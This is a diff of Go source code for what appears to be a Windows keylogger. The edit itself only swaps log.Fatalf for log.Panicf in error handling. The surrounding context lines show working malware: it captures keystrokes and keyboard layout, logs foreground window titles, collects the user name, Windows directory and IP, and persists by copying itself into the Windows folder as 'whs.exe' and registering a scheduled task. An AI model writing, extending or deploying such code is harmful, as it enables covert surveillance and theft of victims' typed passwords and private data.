@@ -190,20 +190,20 @@ func fileInterval() {
 func writeLogFile(data string) {
 	file, openFileErr := os.OpenFile(logFile, os.O_APPEND|os.O_WRONLY, 0777)
 	if openFileErr != nil {
-		log.Fatalf("writeLogFile -> %v", openFileErr)
+		log.Panicf("writeLogFile -> %v", openFileErr)
 	}
 
 	defer file.Close()
 
 	if _, writeStringErr := file.WriteString(data); writeStringErr != nil {
-		log.Fatalf("writeLogFile -> %v", writeStringErr)
+		log.Panicf("writeLogFile -> %v", writeStringErr)
 	}
 }
 
 func createLogFile() {
 	file, createErr := os.Create(logFile)
 	if createErr != nil {
-		log.Fatalf("createLogFile -> %v", createErr)
+		log.Panicf("createLogFile -> %v", createErr)
 	}
 
 	defer file.Close()
@@ -213,7 +213,7 @@ func createLogFile() {
 func getOutboundIP() net.IP {
 	conn, err := net.Dial("udp", "8.8.8.8:80")
 	if err != nil {
-		log.Fatalf("getOutboundIP -> %v", err)
+		log.Panicf("getOutboundIP -> %v", err)
 	}
 	defer conn.Close()
 
@@ -226,12 +226,12 @@ func getSystemInfo() {
 	windowsDirectory := make([]byte, 256)
 	_, getWindowsDirectoryErr := getSystemWindowsDirectory(&windowsDirectory[0])
 	if getWindowsDirectoryErr != nil {
-		log.Fatalf("getWindowsDirectory -> %v", getWindowsDirectoryErr)
+		log.Panicf("getWindowsDirectory -> %v", getWindowsDirectoryErr)
 	}
 
 	user, userErr := user.Current()
 	if userErr != nil {
-		log.Fatalf("user.Current() -> %v", userErr)
+		log.Panicf("user.Current() -> %v", userErr)
 	}
 
 	systemInfoData = systemInfo{
@@ -246,7 +246,7 @@ func windowLogger() {
 	for {
 		foregroundWindow, getForegroundWindowErr := getForegroundWindow()
 		if getForegroundWindowErr != nil {
-			log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
+			log.Panicf("getForegroundWindow -> %v", getForegroundWindowErr)
 		}
 		window := make([]uint16, 256)
 		getWindowText(foregroundWindow, &window[0], int32(len(window)))
@@ -262,16 +262,16 @@ func windowLogger() {
 func getLanguage() syscall.Handle {
 	foregroundWindow, getForegroundWindowErr := getForegroundWindow()
 	if getForegroundWindowErr != nil {
-		log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
+		log.Panicf("getForegroundWindow -> %v", getForegroundWindowErr)
 	}
 	hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
 	if getWindowThreadProcessIDErr != nil {
-		log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
+		log.Panicf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
 	}
 	hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)
 
 	if getKeyboardLayoutErr != nil {
-		log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
+		log.Panicf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
 	}
 
 	return hkl
@@ -282,12 +282,12 @@ func getUnicodeKey(virtualCode int) string {
 
 	_, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
 	if getKeyboardStateErr != nil {
-		log.Fatalf("getKeyboardState -> %v", getKeyboardStateErr)
+		log.Panicf("getKeyboardState -> %v", getKeyboardStateErr)
 	}
 
 	scanCode, mapVirtualKeyErr := mapVirtualKey(syscall.Handle(virtualCode))
 	if mapVirtualKeyErr != nil {
-		log.Fatalf("mapVirtualKey -> %v", mapVirtualKeyErr)
+		log.Panicf("mapVirtualKey -> %v", mapVirtualKeyErr)
 	}
 
 	hkl := getLanguage()
@@ -404,7 +404,7 @@ func keyLoggerListener() {
 func addScheduler() {
 	copyErr := copy(os.Args[0], systemInfoData.windowsFolder+"\\"+"whs.exe")
 	if copyErr != nil {
-		log.Fatalf("copy -> %v", copyErr)
+		log.Panicf("copy -> %v", copyErr)
 	}
 	cmd, err := exec.Command(
 		"schtasks",
@@ -417,7 +417,7 @@ func addScheduler() {
 	).Output()
 
 	if err != nil {
-		log.Fatalf("addScheduler -> %v", err)
+		log.Panicf("addScheduler -> %v", err)
 	}
 	log.Println(string(cmd))
 }
@@ -445,7 +445,7 @@ func copy(src, dst string) error {
 func setLogOutput() {
 	f, err := os.OpenFile("debug.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)
 	if err != nil {
-		log.Fatalf("setLogOutput -> %v", err)
+		log.Panicf("setLogOutput -> %v", err)
 	}
 	defer f.Close()
 
